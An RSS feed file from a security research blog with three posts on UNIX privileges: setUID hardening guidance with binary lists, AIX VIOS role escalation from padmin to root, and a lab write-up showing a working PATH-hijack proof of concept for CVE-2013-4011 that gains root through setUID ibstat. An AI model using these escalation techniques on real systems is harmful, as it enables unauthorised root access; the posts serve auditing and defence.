@@ -1,0 +1,357 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; AIX</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/aix/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>UNIX and Linux setUID advice and guidance</title>
+		<link>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/</link>
+		<comments>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/#comments</comments>
+		<pubDate>Fri, 16 Jun 2017 14:41:53 +0000</pubDate>
+		<dc:creator><![CDATA[AFC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[FreeBSD]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[Solaris]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5793</guid>
+		<description><![CDATA[<p>It is a topic that often comes up on client engagements, usually when running structured build reviews of Linux &#8220;gold builds&#8221;, but occasionally when trying to explain in detail how we used a Linux system to pivot internally. SetUID and setGID files are inevitably a risk, potentially allowing attackers to elevate privileges to root from [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/">UNIX and Linux setUID advice and guidance</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>It is a topic that often comes up on client engagements, usually when running structured build reviews of Linux &#8220;gold builds&#8221;, but occasionally when trying to explain in detail how we used a Linux system to pivot internally.</p>
+<p>SetUID and setGID files are inevitably a risk, potentially allowing attackers to elevate privileges to root from a basic user. When shared out on SMB or NFS shares they can spread the risk even further.<span id="more-5793"></span></p>
+<p>One good approach would be:</p>
+<p>&#8220;The only good setUID is a chmod -s setuid&#8221; i.e. deactivate this particular functionality.</p>
+<p>However, sysadmins may (understandably) get a bit wobbly when we suggest this and come up with a number of fairly valid reasons why this is tricky. They have a point to some extent, but this is 2017 and we should be biting some of these bullets.</p>
+<p>Yes, reducing the risk in this area is tough, but it is in fact a good start in defining least privilege security controls. You can learn how little or how much power individual users require and manage this accordingly. You can also test your changes before rolling them out and sanity check the advice given.</p>
+<p>At the very least we need a list of files that should not be setUID that we can give to sysadmins and, with confidence, recommend removing or changing the permissions. A pragmatic strategy for mitigating the risks incurred would also be good.</p>
+<h2>So what are they?</h2>
+<p>SetUID/setGID bits are file permissions set on binary files when we need them to run with the permissions of the owner (setUID) or the group (setGID) that owns the file, usually a root or equivalent user. Historically this functionality was entrenched in UNIX and Linux and was necessary, up to a point, for a system to function as intended.</p>
+<p>Many vendors are now working toward eliminating the requirement for these permissions and UNIX based systems can be configured, with some care, not to use them.</p>
+<p>We potentially have 3 categories of setUID and setGID files:</p>
+<h3>The &#8220;naughty&#8221; list</h3>
+<ul>
+<li>May have become setUID by accident, installation of third-party software, malicious activity or sloppy coding and should almost certainly not be allowed</li>
+<li>tar, find, vi, etc</li>
+<li>Likely high risk to get root easily</li>
+<li>Epic fail -rwsrw-rw- More common than you would think</li>
+<li>Vendor supplied software often a culprit</li>
+</ul>
+<h3>The &#8220;remove&#8221; list</h3>
+<ul>
+<li>Redundant, legacy or not really required to be setUID</li>
+<li>rcp, arping, etc</li>
+<li>Likely low risk but should be easy to remove</li>
+</ul>
+<h3>The &#8220;allowed&#8221; list</h3>
+<ul>
+<li>OS may fail to function as expected if setUID is removed without care</li>
+<li>For example passwd, sudo</li>
+<li>Should be mitigated to minimise risks</li>
+<li>Many can be reclassified as 2 above and have the setUID bit removed</li>
+</ul>
+<p>We report on categories 1 (naughty) and 2 (remove) scoring appropriate to the risk and ease of exploitation. We report on 3 (allowed) with recommendations to mitigate.</p>
+<p>For example, a setUID on the find command (or any shell command with abilities to run other programs or shells) would be a high risk vulnerability allowing regular users to become root fairly easily.</p>
+<h2>How to deal with these issues?</h2>
+<p>The approach to recommend to customers:</p>
+<ol>
+<li>Audit &#8211; find all setUID and setGID files on the system locally and on all filesystems not mounted nosetuid</li>
+<li>Validate &#8211; elfsign and cross checks against vendor checksums</li>
+<li>Eliminate where possible &#8211; uninstall, chmod -s or rm</li>
+<li>Mitigate where necessary &#8211; FIM, auditing, remote logging, mount NAS nosetuid</li>
+</ol>
+<p>This applies primarily to common Linux distributions. Solaris and AIX for example may have slightly different filenames and locations, but similar principles apply.</p>
+<p>The ubiquitous sudo or other equivalent tools can be used to configure fine grained privilege management without the requirement for setUID permissions. Your version of sudo must be up to date, the sudoers configuration files must be secure and have a strictly limited set of commands allowed per user or group.</p>
+<p>Customers need to consider how the remediation and mitigation steps fit within their overall strategies for user and privilege management alongside local and remote file permissions.</p>
+<p>For example:</p>
+<p>Do they have a good FIM solution and can they utilise remote logging as a mitigation? Do they wish to work at the standard build level and have a hardened standard build? If so, then maybe they&#8217;re in the right place to look at removing these permissions?</p>
+<p>In particular File Integrity Monitoring, which should focus on the most vulnerable files on a system, should track any changes to the files with the setUID/setGID bit set. Any changes should be audited and remotely logged to ensure that an attacker cannot cover their tracks.</p>
+<p>Other mitigation techniques include SELinux and other RBAC mechanisms on Linux, Trusted Execution and Trusted Computing Base on AIX and RBAC on Solaris.</p>
+<p>More recent Linux kernels (starting 2.6.26) can make use of capabilities which provide fine-grained control over superuser permissions, allowing use of the root user to be avoided.</p>
+<p>Sysadmins need some encouragement and support in both remediation and mitigation. If something unexpected does not work upon removing a setUID file permission, it is important to try to use that as a learning experience and a consequence of taking least privilege as far as possible.</p>
+<p>At the very least tighten up your sudo configuration and remove as many setUIDs as you can.</p>
+<h3>Finding setUID and setGID files</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+</pre>
+<p>Example output:</p>
+<p>Here is a setUID file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+-rws--x--x. 1 root root 23960 Sep 23  2016 /usr/bin/chfn
+</pre>
+<p>And here is a setGID file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+-r-xr-sr-x. 1 root tty 15392 May  4  2014 /usr/bin/wall
+</pre>
+<h3>Just for fun</h3>
+<p>Snapshot a VM of your favourite Linux distro and run the following command (<b>this will break your system in odd ways, so never do it to a production system</b>) and run the following commands:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# find / -type f -perm -u+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setUID.lst
+# find / -type f -perm -g+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setGID.lst
+# for a in `cat /var/tmp/setUID.lst`; do chmod u-s $a; done
+# for a in `cat /var/tmp/setGID.lst`; do chmod g-s $a; done
+</pre>
+<p>See what breaks.</p>
+<p>You can revert to the snapshot if your nerve does not hold.</p>
+<p>You should be able to reboot the machine and log in as a normal user. After that you will discover the limitations you have imposed upon yourself and the operating system.</p>
+<h3>The lists (mid 2017) which are not exhaustive</h3>
+<p>N.B. PATHs to the files may vary&#8230;</p>
+<h3>The &#8220;naughty&#8221; list</h3>
+<ul>
+<li>/usr/bin/awk</li>
+<li>/bin/tar</li>
+<li>/usr/bin/python</li>
+<li>/usr/bin/script</li>
+<li>/usr/bin/man</li>
+<li>/usr/bin/ssh</li>
+<li>/usr/bin/scp</li>
+<li>/usr/bin/git</li>
+<li>/usr/bin/find</li>
+<li>/usr/bin/gdb</li>
+<li>/usr/bin/pico</li>
+<li>/usr/bin/nano</li>
+<li>/usr/bin/zip</li>
+<li>/usr/bin/vi</li>
+<li>/usr/sbin/lsof</li>
+<li>/bin/cat</li>
+<li>/usr/bin/vim</li>
+<li>/usr/bin/gvim</li>
+</ul>
+<p>The point with this list is that they should not really be setUID or setGID and they all have command options that could spawn a shell or otherwise engage in mischief.</p>
+<h3>The &#8220;remove&#8221; list</h3>
+<ul>
+<li>/usr/bin/rcp</li>
+<li>/usr/bin/rlogin</li>
+<li>/usr/bin/rsh</li>
+<li>/usr/libexec/openssh/ssh-keysign</li>
+<li>/usr/lib/openssh/ssh-keysign</li>
+<li>/sbin/netreport</li>
+<li>/usr/sbin/usernetctl</li>
+<li>/usr/sbin/userisdnctl</li>
+<li>/usr/sbin/pppd</li>
+<li>/usr/bin/lockfile</li>
+<li>/usr/bin/mail-lock</li>
+<li>/usr/bin/mail-unlock</li>
+<li>/usr/bin/mail-touchlock</li>
+<li>/usr/bin/dotlockfile</li>
+<li>/usr/bin/arping</li>
+<li>/usr/sbin/uuidd</li>
+<li>/usr/bin/mtr</li>
+<li>/usr/lib/evolution/camel-lock-helper-1.2</li>
+<li>/usr/lib/pt_chown</li>
+<li>/usr/lib/eject/dmcrypt-get-device</li>
+<li>/usr/lib/mc/cons.saver</li>
+</ul>
+<p>Consider removing as a good mitigation strategy.</p>
+<p>Here&#8217;s some others that are usually installed setUID, however, on a hardened system they can usually have their setUID/setGID bits removed:</p>
+<ul>
+<li>/bin/mount</li>
+<li>/bin/umount</li>
+<li>/usr/bin/at</li>
+<li>/usr/bin/newgrp</li>
+<li>/usr/bin/ssh-agent</li>
+<li>/sbin/mount.nfs</li>
+<li>/sbin/umount.nfs</li>
+<li>/sbin/mount.nfs4</li>
+<li>/sbin/umount.nfs4</li>
+<li>/usr/bin/crontab</li>
+<li>/usr/bin/wall</li>
+<li>/usr/bin/write</li>
+<li>/usr/bin/screen</li>
+<li>/usr/bin/mlocate</li>
+<li>/usr/bin/chage</li>
+<li>/usr/bin/chfn</li>
+<li>/usr/bin/chsh</li>
+<li>/bin/fusermount</li>
+<li>/usr/bin/Xorg</li>
+<li>/usr/bin/X</li>
+<li>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</li>
+<li>/usr/lib/vte/gnome-pty-helper</li>
+<li>/usr/lib/libvte9/gnome-pty-helper</li>
+<li>/usr/lib/libvte-2.90-9/gnome-pty-helper</li>
+</ul>
+<h3>The &#8220;allowed&#8221; list</h3>
+<ul>
+<li>/bin/ping</li>
+<li>/bin/su</li>
+<li>/sbin/pam_timestamp_check</li>
+<li>/sbin/unix_chkpwd</li>
+<li>/usr/bin/gpasswd</li>
+<li>/usr/bin/locate</li>
+<li>/usr/bin/passwd</li>
+<li>/usr/libexec/utempter/utempter</li>
+<li>/usr/sbin/lockdev</li>
+<li>/usr/sbin/sendmail.sendmail</li>
+<li>/usr/bin/expiry</li>
+<li>/bin/ping6</li>
+<li>/usr/bin/traceroute6.iputils</li>
+<li>/usr/bin/pkexec</li>
+<li>/usr/bin/sudo</li>
+<li>/usr/bin/sudoedit</li>
+<li>/usr/sbin/postdrop</li>
+<li>/usr/sbin/postqueue</li>
+<li>/usr/sbin/suexec</li>
+<li>/usr/lib/squid/ncsa_auth</li>
+<li>/usr/lib/squid/pam_auth</li>
+<li>/usr/kerberos/bin/ksu</li>
+<li>/usr/sbin/ccreds_validate</li>
+</ul>
+<h2>Final words</h2>
+<p>It&#8217;s worth noting that we know these lists won&#8217;t work for everyone; systems are complex and behaviour is intertwined. That said, no matter what your opinion on the necessity or otherwise of a setUID/setGID bit on a given file, we&#8217;d like to think the approach of knowing which files have the setUID/setGID bit and why is something we can all get on board with.</p>
+<h3>Some good references</h3>
+<ul>
+<li><a title="Understand the setuid and setgid permissions to improve security" href="http://www.techrepublic.com/blog/it-security/understand-the-setuid-and-setgid-permissions-to-improve-security/">Understand the setuid and setgid permissions to improve security</a></li>
+<li><a title="Beware of empty paths" href="https://labs.portcullis.co.uk/blog/beware-of-empty-paths/">Beware of empty paths</a></li>
+<li><a title="Exploiting SUID Executables" href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/">Exploiting SUID Executables</a></li>
+<li><a title="Capabilities" href="https://wiki.archlinux.org/index.php/Capabilities">Capabilities &#8211; ArchWiki</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/">UNIX and Linux setUID advice and guidance</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>padmin to root: Roles on AIX</title>
+		<link>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/#comments</comments>
+		<pubDate>Fri, 02 Oct 2015 14:47:26 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5255</guid>
+		<description><![CDATA[<p>Following a recent post from a consultant at IBM discussing how how privileged access should be performed on VIOS, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love root. For those of you that are new, welcome aboard. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Following a recent post from a consultant at IBM discussing how <a title="how privileged access should be performed on VIOS" href="https://www.ibm.com/developerworks/community/blogs/AIXDownUnder/entry/VIOS_switching_between_padmin_and_root1?lang=en">how privileged access should be performed on VIOS</a>, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love <a title="root" href="/tag/root/">root</a>. For those of you that are new, welcome aboard.<span id="more-5255"></span></p>
+<p>Let&#8217;s start by defining what VIOS is. VIOS is a subsystem that runs on a logical partition (LPAR) which manages shared hardware such as disks and network adaptors and allows other LPARs to access them. VIOS is managed via a special padmin account which gives access to a restricted shell from where the hardware can be managed. In practice, however it&#8217;s just another AIX LPAR and as the blog post from IBM notes, setup_oem_env can be used to move from the padmin user to the root user.</p>
+<p>Firstly, note that setup_oem_env is not setUID. So how does it work? Examining the padmin user we see that it has a single role (PAdmin):</p>
+<p>The membership of a role is determined by /etc/security/user but we can examine a specific use using the rolelist command like so:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rolelist -u padmin
+PAdmin
+</pre>
+<p>You can also find your current active role using the -e flag to rolelist. Moving on, what does the PAdmin role mean?</p>
+<p>Roles are defined in /etc/security/role but as with role membership, we can also use shell commands to enumerate them. For example, the following shows what authorisations the PAdmin role has:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ lsrole PAdmin
+PAdmin
+authorizations=vios.device,vios.fs,vios.install,vios.lvm,vios.network,vios.security,vios.system,vios.oemsetupenv,vios.system.cluster,aix.system.config.artex
+rolelist= groups=staff visibility=1 screens=* dfltmsg= msgcat= auth_mode=INVOKER
+id=23
+</pre>
+<p>In the context of getting root, vios.oemsetupenv is the charm. This and other AIX authorisations are defined in /etc/security/privcmds. It is possible to specify what commands the possessor of the vios.oemsetupenv authorisation can run (and indeed the privileges with which those commands will ultimately be executed).</p>
+<p>You see, AIX like Solaris, is gradually getting rid of the concept that uid=0 is god. IBM haven&#8217;t taken this as far as Oracle yet but there&#8217;s nothing to stop a dedicated administrator from leveraging this functionality. So, if you&#8217;re auditing an AIX box, I would very much recommend checking what roles users have (via /etc/security/user) to ensure that no appropriate roles have been assigned.</p>
+<p>PS I&#8217;ve never seen this used in practice (outside of VIOS), but I&#8217;m sure there will be a first time.<br />
+PPS rolelist -p will tell you what roles a given process has.<br />
+PPPS esaadmin has the SysConfig role but it&#8217;s not normally an active account.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</title>
+		<link>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/#comments</comments>
+		<pubDate>Sat, 20 Jul 2013 11:01:33 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-4011]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[imisslsd]]></category>
+		<category><![CDATA[root]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1151</guid>
+		<description><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting advisory come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting <a title="advisory" href="http://aix.software.ibm.com/aix/efixes/security/infiniband_advisory.asc">advisory</a> come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided to take it for a spin.<span id="more-1151"></span></p>
+<p>The advisory concerned AIX (one of my favourite operating systems to pwn) and related to a potential privilege escalation vulnerability in AIX 6.1 and AIX 7.1&#8242;s ibstat command which has setUID root permissions set on it. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release.</p>
+<p>It&#8217;s fair to say that there are a substantial number of such vulnerabilities in AIX 7.1 but my interest was peaked because it wasn&#8217;t one that we&#8217;d found.</p>
+<p>To start with, I grabbed a copy of the efix and extracted it. You&#8217;ll notice that the tarball referenced within the advisory contains patches for all supported AIX releases which are delivered as compressed epkg files. It might not be immediately clear but these are actually just tarballs with some meta data describing the patched files. So let&#8217;s extract one and take a look:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ tar xvf iv43580m2a.130619.epkg
+x ./ecfile, 837 bytes, 2 media blocks.
+...
+x ./EFILE1, 47516 bytes, 93 media blocks.
+x ./EFILE2, 17576 bytes, 35 media blocks.
+...
+$ cat ecfile
+...
+EFIX_FILE:
+EFIX_FILE_NUM=1
+...
+TARGET_FILE=/usr/sbin/ibstat
+...
+EFIX_FILE:
+EFIX_FILE_NUM=2
+...
+TARGET_FILE=/usr/sbin/arp.ib
+...
+</pre>
+<p>I&#8217;ve stripped out the less interesting bits of ecfile but we can clearly see that this patches two files, /usr/sbin/ibstat and /usr/sbin/arp.ib.</p>
+<p>So the next question is that have they actually changed? My first thought was to objdump the two binaries and compare the output. This should give us a clear idea of what libc function calls are being utilised (and thus what the vulnerability is likely to be) however they had been stripped of all symbols which would make this a long and tedious process. So what else can we do? Well, knowing what classes of vulnerability AIX commonly falls foul of, I figured there was a reasonable likelihood that the vulnerability pertained to some kind of command injection, so I ran strings across the vulnerable binary to see if it was possible in this case:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ strings /usr/sbin/ibstat
+@(#)23 1.5 src/bos/usr/ccs/lib/libpthreads/init.c, libpth, bos53H, h2006_10B1 3/5/06 21:33:24
+...
+ifconfig %s
+...
+</pre>
+<p>It certainly looked like this was a possibility, however I wanted to be sure. My next step was to run strings across the new binary and compare the output. For this, I used kompare:</p>
+<div id="attachment_1152" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-removed-from-the-binary/" rel="attachment wp-att-1152"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/07/missingcommands-300x37.png" alt="Commands that have been removed from the binary" width="300" height="37" class="size-medium wp-image-1152" /></a><p class="wp-caption-text">Commands that have been removed from the binary</p></div>
+<div id="attachment_1153" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-added-to-the-binary/" rel="attachment wp-att-1153"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/07/replacedcommands-300x45.png" alt="Commands that have been added to the binary" width="300" height="45" class="size-medium wp-image-1153" /></a><p class="wp-caption-text">Commands that have been added to the binary</p></div>
+<p>Now we can quite clearly see what has changed. It appears that in the vulnerable binary certain system commands are called, without a fully qualified path. What does this mean? Well, unless the ibstat binary correctly sanitises the PATH environment variable when it is called then binaries such as arp etc will be called by ibstat from the first matching directory specified in PATH.</p>
+<p>What this means is that we can provide our own malicious binaries in a location which we control and have them executed as root when we run the ibstat binary (as it has setUID root permissions set).</p>
+<p>We can prove this as follows:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ls -l dummybin/
+total 8
+lrwxrwxrwx 1 user staff 8 Jul 20 09:59 arp -&gt; ifconfig
+-rwxr-xr-x 1 user staff 49 Jul 20 10:55 ifconfig
+lrwxrwxrwx 1 user staff 8 Jul 20 09:59 lsattr -&gt; ifconfig
+$ cat dummybin/ifconfig
+#!/bin/sh
+
+echo $0
+echo $1
+echo $2
+id
+sleep 1000
+$ PATH=/home/user/ibstat/dummybin:/usr/bin:/etc:/usr/sbin:/usr/ucb /usr/sbin/ibstat -a lo0
+
+===============================================================================
+IB INTERFACE ARP TABLE
+===============================================================================
+/home/user/ibstat/dummybin/arp
+-t
+ib
+uid=208(user) gid=1(staff) euid=0(root)
+</pre>
+<p>And there you have it, euid=0 in under half an hour.</p>
+<p>If you enjoyed this write up be sure to get yourself a ticket for <a title="44CON" href="http://shop.44con.com/collections/44con-tickets">44CON</a> where I will be presenting the next round of our more detailed research into modern POSIX alike OS, including how I uncovered potentially exploitable bugs in ~400 Debian GNU/Linux packages in a single day.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
